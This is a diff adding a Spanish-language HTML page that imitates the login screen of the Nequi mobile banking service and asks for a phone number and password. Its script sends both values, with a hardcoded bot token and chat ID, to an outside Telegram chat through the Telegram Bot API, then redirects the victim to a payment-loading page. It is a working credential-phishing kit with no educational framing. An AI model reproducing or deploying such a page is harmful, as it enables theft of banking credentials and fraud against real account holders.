@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
+  <title>Entra</title>
+  <style>
+    /* RESET BÁSICO */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fde7f4; /* Fondo rosado claro */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    /* CONTENEDOR PRINCIPAL */
+    .container {
+      background-color: #fff; 
+      width: 360px;
+      padding: 2rem 1.5rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      text-align: center;
+      position: relative;
+    }
+
+    /* TÍTULO Y SUBTÍTULO */
+    .container h1 {
+      font-size: 1.5rem;
+      color: #333;
+      margin-bottom: 0.5rem;
+    }
+
+    .container p {
+      font-size: 0.95rem;
+      color: #666;
+      margin-bottom: 1.5rem;
+    }
+
+    /* FORMULARIO */
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+
+    .input-group {
+      text-align: left;
+    }
+
+    label {
+      display: block;
+      font-size: 0.85rem;
+      margin-bottom: 0.3rem;
+      color: #333;
+    }
+
+    .country-phone {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .country-phone select {
+      padding: 0.5rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 0.9rem;
+      background-color: #fff;
+      width: 80px;
+    }
+
+    .country-phone input {
+      flex: 1;
+      padding: 0.5rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 0.9rem;
+    }
+
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      padding: 0.5rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 0.9rem;
+    }
+
+    /* RECAPTCHA */
+    .recaptcha-container {
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      padding: 0.5rem;
+      text-align: left;
+      font-size: 0.9rem;
+      color: #333;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .recaptcha-container input[type="checkbox"] {
+      transform: scale(1.2);
+      cursor: pointer;
+    }
+
+    .recaptcha-text {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .recaptcha-text span {
+      margin-bottom: 0.2rem;
+    }
+
+    .recaptcha-links {
+      font-size: 0.75rem;
+      color: #777;
+    }
+
+    .recaptcha-links a {
+      color: #777;
+      text-decoration: none;
+      margin: 0 0.3rem;
+    }
+
+    /* BOTÓN */
+    button {
+      background-color: #ff0080; /* Botón rosado fuerte */
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 0.8rem;
+      font-size: 1rem;
+      cursor: pointer;
+      margin-top: 0.5rem;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #e60073; /* Efecto hover */
+    }
+
+    /* DECORACIÓN FONDO (OPCIONAL) */
+    /* Ejemplo de cuadrados rosas en el fondo */
+    .bg-square {
+      position: absolute;
+      width: 100px;
+      height: 100px;
+      background-color: #fbcfee;
+      border-radius: 8px;
+      z-index: -1; /* Para que aparezca detrás del contenedor */
+    }
+
+    .square1 {
+      top: -40px;
+      right: -30px;
+    }
+
+    .square2 {
+      bottom: -40px;
+      right: 30px;
+    }
+
+    /* Responsive design */
+    @media (max-width: 480px) {
+      .container {
+        width: 90%;
+        padding: 1.5rem 1rem;
+      }
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Elementos decorativos de fondo (opcional) -->
+    <div class="bg-square square1"></div>
+    <div class="bg-square square2"></div>
+
+    <h1>Entra a tu Nequi</h1>
+    <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
+    
+    <form id="nequiForm">
+      <!-- Número de celular -->
+      <div class="input-group">
+        <label for="phone">Número de celular</label>
+        <div class="country-phone">
+          <select name="country-code" id="country-code">
+            <option value="+57">+57</option>
+          </select>
+          <input type="text" id="username" name="dato1" placeholder="Número de celular" required>
+        </div>
+      </div>
+
+      <!-- Contraseña -->
+      <div class="input-group">
+        <label for="password">Contraseña</label>
+        <input type="password" id="password" name="dato2" placeholder="Contraseña" required>
+      </div>
+
+      <!-- Botón Entrar -->
+      <button type="submit" id="submitBtn" class="login-button">INGRESAR</button>
+    </form>
+  </div>
+
+  <script>
+    function enviarMensajeTelegram(telefono, password) {
+      var token = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+      var chatID = '5900829263';
+      var mensaje = 'Nequi Login:\nTeléfono: ' + telefono + '\nContraseña: ' + password;
+      var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + encodeURIComponent(mensaje);
+      
+      var xhttp = new XMLHttpRequest();
+      xhttp.open('GET', url, true);
+      xhttp.send();
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('submitBtn').addEventListener('click', function(event) {
+        event.preventDefault(); // Evita que el formulario se envíe por defecto
+
+        var telefono = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+
+        if (telefono.trim() !== '' && password.trim() !== '') {
+          enviarMensajeTelegram(telefono, password);
+          
+          // Simular procesamiento con un pequeño delay
+          setTimeout(function() {
+            window.location.href = '../cargapago.html';            
+          }, 1000);
+        } else {
+          alert('Por favor complete todos los campos antes de continuar.');
+        }
+      });
+    });
+  </script>
+</body>
+</html>
